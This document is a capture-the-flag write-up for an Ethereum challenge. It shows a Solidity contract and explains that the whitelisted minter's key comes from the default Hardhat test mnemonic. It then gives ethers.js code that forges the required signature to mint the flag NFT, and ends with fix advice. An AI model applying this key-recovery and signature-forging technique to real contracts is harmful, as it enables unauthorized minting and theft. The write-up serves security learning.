# Challenge Overview
- Name: Challenge 4
- Category: Smart Contract Exploitation
- Objective: Mint the NFT associated with Challenge 4.

# Contract Code

```solidity
//SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";
import "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";

interface INFTFlags {
    function mint(address _recipient, uint256 _challengeId) external;
}

contract Challenge4 is Ownable {
    using ECDSA for bytes32;
    using MessageHashUtils for bytes32;

    event MinterAdded(address indexed minter);
    event MinterRemoved(address indexed minter);

    address public nftContract;
    mapping(address => bool) public isMinter;

    constructor(address _nftContract) Ownable(msg.sender) {
        nftContract = _nftContract;
    }

    function addMinter(address _minter) public onlyOwner {
        isMinter[_minter] = true;

        emit MinterAdded(_minter);
    }

    function removeMinter(address _minter) public onlyOwner {
        isMinter[_minter] = false;

        emit MinterRemoved(_minter);
    }

    function mintFlag(address _minter, bytes memory signature) public {
        require(isMinter[_minter], "Not a minter");

        bytes32 message = keccak256(abi.encode("BG CTF Challenge 4", msg.sender));
        bytes32 hash = message.toEthSignedMessageHash();

        address recoveredSigner = hash.recover(signature);

        require(recoveredSigner == _minter, "Invalid signature");

        INFTFlags(nftContract).mint(msg.sender, 4);
    }
}
```

# Vulnerability Analysis

The mintFlag function uses an off-chain signature verification mechanism to allow authorized minters to mint the NFT. It performs the following checks:
1. The `_minter` passed must be a whitelisted minter.
2. The signature must be valid for the message generated and the signature must be signed by the `_minter`.

The issue lies in the fact that if an attacker obtains the mnemonic of a whitelisted minter, they can generate a valid signature and bypass the restrictions.

# Exploit Execution

We were given an hint to check the deployment script and upon examining, we identified how the whitelisted minter was set:

```javascript
// -> Set allowed minter for Challenge 4
const challenge4Contract = await hre.ethers.getContract<Contract>("Challenge4", deployer);
const hAccounts = hre.config.networks.hardhat.accounts as HardhatNetworkHDAccountsConfig;
const derivationPath = "m/44'/60'/0'/0/12";
const challenge4Account = HDNodeWallet.fromMnemonic(Mnemonic.fromPhrase(hAccounts.mnemonic), derivationPath);
```

This script revealed the derivation path and allowed us to extract the mnemonic of the minter(we can just `console.log(challenge4Account)` to see the phrase and run the deployment script locally). Using this mnemonic, we generated a valid signature as follows:

```javascript
const mnemonic = "test test test test test test test test test test test junk";
const wallet = ethers.Wallet.fromPhrase(mnemonic);
const msgSender = "YOUR_ADDRESS";

// Step 1: Replicate keccak256(abi.encode(...)) in Solidity
const encodedMessage = ethers.AbiCoder.defaultAbiCoder().encode(
  ["string", "address"],
  ["BG CTF Challenge 4", msgSender]
);

const messageHash = ethers.keccak256(encodedMessage);

// Step 2: Replicate toEthSignedMessageHash in Solidity
const signedMessageHash = ethers.hashMessage(ethers.getBytes(messageHash));

// Step 3: Sign the message hash
const signature = await wallet.signMessage(ethers.getBytes(messageHash));

console.log("Signature:", signature);
```

## Execution Steps:
1. Extract the mnemonic from the deployment script.
2. Generate the signature using the whitelisted minter's wallet.
3. Call the mintFlag function with the valid signature.

# Result & Impact

This exploit allows unauthorized users to mint the NFT without the intended restrictions. Compromise of the minter's mnemonic poses a significant security risk, enabling unauthorized access.

# Fix Recommendation

To mitigate this issue:
1. Use a more secure mechanism for signature validation.
2. Avoid using hardcoded mnemonics and derivation paths in deployment scripts.